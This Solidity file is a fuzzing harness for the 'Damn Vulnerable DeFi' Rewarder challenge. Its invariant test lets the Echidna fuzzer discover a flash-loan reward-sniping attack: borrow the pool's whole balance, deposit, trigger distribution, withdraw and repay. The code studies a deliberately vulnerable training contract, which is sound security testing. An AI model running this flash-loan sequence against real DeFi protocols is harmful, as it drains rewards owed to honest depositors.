// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "../FlashLoanerPool.sol";
import "../RewardToken.sol";
import "../TheRewarderPool.sol";
import "../../DamnValuableToken.sol";

/**
 * npx hardhat clean && npx hardhat compile --force && echidna-test . --contract EchidnaRewarder --config ./contracts/the-rewarder/echidna/config.yaml
 */

contract EchidnaRewarder {
    uint256 REWARDS_ROUND_MIN_DURATION = 5 days;
    uint256 flashLoanAmount;
    uint256 reward;

    address POOL = 0x1D7022f5B17d2F8B695918FB48fa1089C9f85401;
    address REWARDER = 0x0B1ba0af832d7C05fD64161E0Db78E85978E8082;
    address REWARD_TOKEN = 0x3db3c524ED6Bce9B5799eBF43642C46d0D096858;
    address DAMN_VALUABLE_TOKEN = 0x1dC4c1cEFEF38a777b15aA20260a54E584b16C48;

    FlashLoanerPool pool;
    TheRewarderPool rewarder;
    RewardToken rewardToken;
    DamnValuableToken damnValuableToken;

    uint256[] functionsOrder;
    uint256[3] numArray;

    constructor() {
        pool = FlashLoanerPool(POOL);
        rewarder = TheRewarderPool(REWARDER);
        rewardToken = RewardToken(REWARD_TOKEN);
        damnValuableToken = DamnValuableToken(DAMN_VALUABLE_TOKEN);
    }

    function receiveFlashLoan(uint256 amount) external {
        require(
            msg.sender == address(pool),
            "Only pool can call this function"
        );
        // logic
        require(
            functionsOrder.length > 0,
            "At least one function must be called."
        );
        // call function based on the functionOrder array
        for (uint256 i = 0; i < functionsOrder.length; i++) {
            uint256 funcToBeCalled = functionsOrder[i];
            selectFunctionToCall(funcToBeCalled);
        }
        // get reward amount
        reward = rewardToken.balanceOf(address(this));
        //
        require(
            damnValuableToken.transfer(address(pool), amount),
            "Flashloan pay back failed"
        );
    }

    /**
     * @notice call one of defined function
     * @param funcOrder a number to call the given function
     */
    function selectFunctionToCall(uint256 funcOrder) internal {
        if (funcOrder == 0) {
            // deposit to pool with prior approval
            damnValuableToken.approve(address(rewarder), flashLoanAmount);
            rewarder.deposit(flashLoanAmount);
        }
        if (funcOrder == 1) {
            // withdraw from the pool
            rewarder.withdraw(flashLoanAmount);
        }
        if (funcOrder == 2) {
            // distribute rewards
            rewarder.distributeRewards();
        }
    }

    function setNumArray(
        uint256 num1,
        uint256 num2,
        uint256 num3
    ) public {
        numArray[0] = num1;
        numArray[1] = num2;
        numArray[2] = num3;
    }

    /**
     * @notice helper function to generate different functions in different order to be called in receiveFlashLoan()
     * and thus test all possible scenarios
     * @param _randomNumber input by Echidna which is used to include/exclude function (see BitMap operation)
     */
    function generateFuncsToCall(uint256 _randomNumber) external {
        // delete current functionOrder
        delete functionsOrder;
        // select functions
        uint256 id = 0;
        for (uint256 i = 0; i < numArray.length; i++) {
            // select function according to selectFunctionToCall
            uint256 selectedFunc = numArray[i] % numArray.length;
            // decide whether the function to be included or not
            uint256 bitIndex = _randomNumber & (1 << i);
            // if bitIndex is not zero, than include the function selected
            if (bitIndex > 0) {
                functionsOrder.push(selectedFunc);
                id++;
            }
        }
    }

    // THIS APPROACH DOES NOT FUNCTION
    // function flashLoan(uint256 _amount) public {
    //     uint256 lastRewardsTimestamp = rewarder.lastRecordedSnapshotTimestamp();
    //     require(
    //         block.timestamp >=
    //             lastRewardsTimestamp + REWARDS_ROUND_MIN_DURATION,
    //         "It is useless to call flashloan if no rewards can be taken."
    //     );
    //     flashLoanAmount = _amount;
    //     pool.flashLoan(flashLoanAmount);
    // }

    // THIS APPROACH WORKS
    function flashLoan() public {
        uint256 lastRewardsTimestamp = rewarder.lastRecordedSnapshotTimestamp();
        require(
            block.timestamp >=
                lastRewardsTimestamp + REWARDS_ROUND_MIN_DURATION,
            "It is useless to call flashloan if no rewards can be taken."
        );
        flashLoanAmount = damnValuableToken.balanceOf(address(pool));
        pool.flashLoan(flashLoanAmount);
    }

    // INVARIANT: one user cannot get almost all of reward
    function testRewards() public view {
        assert(reward < 99 ether);
    }
}
